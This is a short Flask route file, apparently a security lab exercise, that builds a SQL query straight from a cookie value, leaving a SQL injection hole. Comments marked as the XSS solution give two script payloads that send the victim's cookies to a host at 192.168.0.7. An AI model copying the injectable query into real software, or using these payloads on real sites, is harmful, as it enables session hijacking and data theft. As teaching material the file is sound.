from flask import render_template, request, Blueprint
from src.db import mysql

main_routes = Blueprint("main_routes",__name__)

@main_routes.route("/")
def homepage():
    cookie = request.cookies.get('name')
    
    conn = mysql.connect()
    cursor = conn.cursor()
    
    cursor.execute(f"SELECT username from users where username = '{cookie}'")
    name = cursor.fetchone()[0]
    
    print(name)
    
    return render_template('home.html', cookie=cookie, name=name)


# Lösung XSS:
 # 1: <script>var i = new Image(0, 0); i.src=`http://192.168.0.7:5000/?cookie=${document.cookie}`; document.body.appendChild(i);</script>
 # 2: <script>new Image().src="http://192.168.0.7:5000/?c="+escape(document.cookie)</script>
